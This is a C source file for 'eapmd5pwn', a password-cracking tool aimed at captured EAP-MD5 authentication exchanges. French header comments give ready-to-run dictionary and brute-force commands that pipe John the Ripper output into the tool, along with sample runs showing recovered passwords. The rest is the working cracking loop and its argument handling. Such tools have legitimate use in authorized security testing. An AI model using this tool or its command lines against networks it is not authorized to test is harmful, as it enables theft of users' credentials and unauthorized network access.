/* Attaque EAP-MD5 par dictionnaire et par force brute */
/*******************************************************/
/* smiler */ 

/* 
 Il faut préalablement avoir effectué une capture Wireshark pour obtenir l'échange EAP-MD5 (challenge response) et l'identité utilisée.
 
 Exemple pour une attaque par dictionnaire avec une permutation john depuis d'un dico :
  $ ./john --wordlist=rockyou_bypopularity.txt --stdout --rules | eapmd5pwn -C [challenge] -R [response] -U 10246 -E 2 -w - 
 
 Exemple pour une attaque par force brute pour tester toutes les possibilités :
  $ ./john -i:all --stdout  | eapmd5pwn -C [challenge] -R [response] -U 10246 -E 2 -w - 
 
 Note : 
 John est compilé par défaut avec une limitation à 8 caractères maxi 
 Si le mot de passe fait plus de 8 caractères, il faut recompiler john en lui spécifiant par exemple 12 caractères maxi.
 Puis refaire un charset pour 12 caractères.

 Par exemple, si on cible un mot de passe de 12 digits :
 
 Génération d'un nouveau .pot de 12 digits :
  $ cat digits12.pot
  :012345678901
 
 Génération du nouveau charset de 12 digits depuis le .pot :
  $ ./john --pot=digits12.pot --make-charset=digits12.chr
  Loaded 10 plaintexts
  Generating charsets... 1 2 3 4 5 6 7 8 9 10 11 12 DONE
  Generating cracking order... DONE
  Successfully written charset file: digits12.chr (10 characters)
 
 Rajouter dans john.conf :
  [Incremental:Digits12]
  File = $JOHN/digits12.chr
  MinLen = 12
  MaxLen = 12
  CharCount = 10
 
 Pour faire une recherche exhaustive avec John et eapmd5pwn :
  $ ./john -i:digits12 -stdout | eapmd5pwn -C [challenge] -R [response] -U 10246 -E 3 -w -
  eapmd5pwn - Dictionary and Brute force attack against EAP-MD5
  words: 18343464  time: 0:00:00:05 0.00%  w/s: 3646K  current: 456345014331
  User password is "123456789012".
  1 passwords in 111111111111.00 seconds: 0.00 passwords/second.
 
 Avec une permutation de dico avec John :
  $ ./john --wordlist=dico_eapmd5.txt --stdout --rules  | eapmd5pwn -C [challenge] -R [response] -U 10246 -E 3 -w -
  eapmd5pwn - Dictionary and Brute force attack against EAP-MD5
  words: 1  time: 0:00:00:00 DONE (Wed Jan 22 14:30:08 2014)  w/s: 33.33  current: 224685794804
  User password is "123456789012".
  1 passwords in 4313171456.00 seconds: 0.00 passwords/second.
 
 Une simple recherche par dico :
  $ ./eapmd5pwn -w dico_eapmd5.txt -C [challenge] -R [response] -U 10246 -E 3
  eapmd5pwn - Dictionary and Brute force attack against EAP-MD5
  User password is "123456789012".
  1 passwords in 0.00 seconds: 37037.04 passwords/second.

*/


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netinet/in.h>
#include <signal.h>

#include <openssl/md5.h>

#include "utils.h"
#include "byteswap.h"
#include "eapmd5pwn.h"
#include "ieee80211.h"
#include "ieee8021x.h"
#include "ietfproto.h"

struct eapmd5pwn_data em;

void cleanexit()
{
	if (em.recovered_pass > 0) {
		exit(0);
	} else {
		exit(1);
	}
}

void usage()
{
	printf("\nUsage: eapmd5pwn [ -w wordfile ] [options]\n");
	printf("\n");
        printf("  -w <wordfile>\tuse wordfile for possible passwords.\n");
        printf("  -U <username>\tUsername of EAP-MD5 user.\n");
        printf("  -C <challenge>\tEAP-MD5 challenge value.\n");
        printf("  -R <response>\tEAP-MD5 response value.\n");
        printf("  -E <eapid>\tEAP-MD5 response EAP ID value (generally : 2)\n");
        printf("  -h\t\tusage information\n");
        printf("\n  Specify the username, challenge and response.\n");
        printf("\n  Dictionary attack:\n   ./eapmd5pwn -w dico_eapmd5.txt -C [challenge] -R [response] -U 10246 -E 3\n");
        printf("\n  Word permutations from a dictionary file:\n   ./john --wordlist=rockyou_bypopularity.txt --stdout --rules | eapmd5pwn -C [challenge] -R [response] -U 10246 -E 3 -w -\n"); 
        printf("\nExhaustive key search:\n   ./john -i:all --stdout | eapmd5pwn -C [challenge] -R [response] -U 10246 -E 3 -w -\n\n");
}



void eapmd5_attack(struct eapmd5pwn_data *em)
{

	FILE *fp;
	int passlen;
	unsigned long wordcount=0;
	uint8_t digest[16];
	char buf[256];
	struct timeval start, finish;
	int success=0;
	float elapsed=0;

	buf[0] = em->respeapid;

	if (*em->wordfile == '-') {
		fp = stdin;
	} else {
		fp = fopen(em->wordfile, "r");
	}

        gettimeofday(&start, 0);

	while(feof(fp) == 0) {
		if (fgets((buf+1), sizeof(buf)-1, fp) == NULL) {
			fclose(fp);
			break;
		}

		wordcount++;
		passlen = strlen(buf)-1;
		memcpy((buf+passlen), em->challenge, 16);

		MD5((uint8_t *)buf, passlen+16, digest);

		if (memcmp(digest, em->response, 16) == 0) {
			success=1;
			fclose(fp);
			break;
		}

	}

        gettimeofday(&finish, 0);

	if (success == 1) {
		em->recovered_pass++;
		buf[passlen] = 0;
		printf("User password is \"%s\".\n", buf+1);
	} else {
		printf("Unable to identify user password, not in the dictionary file.\n");
	}

	if (finish.tv_usec < start.tv_usec) {
		finish.tv_sec -= 1;
		finish.tv_usec += 1000000;
	}
	finish.tv_sec -= start.tv_sec;
	finish.tv_usec -= start.tv_usec;
	elapsed = finish.tv_sec + finish.tv_usec / 1000000.0;

	printf("%lu passwords in %.2f seconds: %.2f passwords/second.\n",
		wordcount, elapsed, wordcount/elapsed);
	return;
}



int main(int argc, char *argv[])
{
	int opt=0;
	extern struct eapmd5pwn_data em;

	memset(&em, 0, sizeof(em));

	printf("eapmd5pwn - Dictionary and Brute force attack against EAP-MD5\n");
	while ((opt = getopt(argc, argv, "w:U:C:R:E:h?")) != -1) {
		switch(opt) {

		case 'w':
			/* word file */
			strncpy(em.wordfile, optarg, sizeof(em.wordfile)-1);
			break;
		case 'C':
			if (strlen(optarg) != 47) {
				usage("Incorrect challenge input length specified.\n");
				exit(1);
			}
			if (str2hex(optarg, em.challenge, 
					sizeof(em.challenge)) < 0) {
				usage("Malformed value specified as challenge.\n");
				exit(1);
			}
			em.chalfound=1;
			break;
		case 'R':
			if (strlen(optarg) != 47) {
				usage("Incorrect response input length specified.\n");
				exit(1);
			}
			if (str2hex(optarg, em.response, 
					sizeof(em.response)) < 0) {
				usage("Malformed value specified as response.\n");
				exit(1);
			}
			em.respfound=1;
			break;
		case 'U':
			strncpy(em.username, optarg, sizeof(em.username)-1);
			em.namefound=1;
			break;
		case 'E':
			em.respeapid=atoi(optarg);
			em.eapid=1;
			break;
		default:
			usage();
			return(-1);
			break;
		}
	}

	/* Register signal handlers */
	signal(SIGINT, cleanexit);
	signal(SIGTERM, cleanexit);
	signal(SIGQUIT, cleanexit);


	/* Test for minimum number of arguments */
	if (argc < 3) {
		usage();
		return -1;
	}

	if (strlen(em.wordfile) < 1) {
		fprintf(stderr, "Must specify a dictionary file with -w.\n");
		usage();
		return -1;
	}

	if (em.namefound && em.chalfound && em.respfound && em.eapid) {
		/* User specified input parameters manually, assume success and start cracking.*/
		em.succfound=1;
		eapmd5_attack(&em);
		return 0;
	}


	if (em.recovered_pass > 0) {
		return 0;
	} else {
		return 1;
	}

}
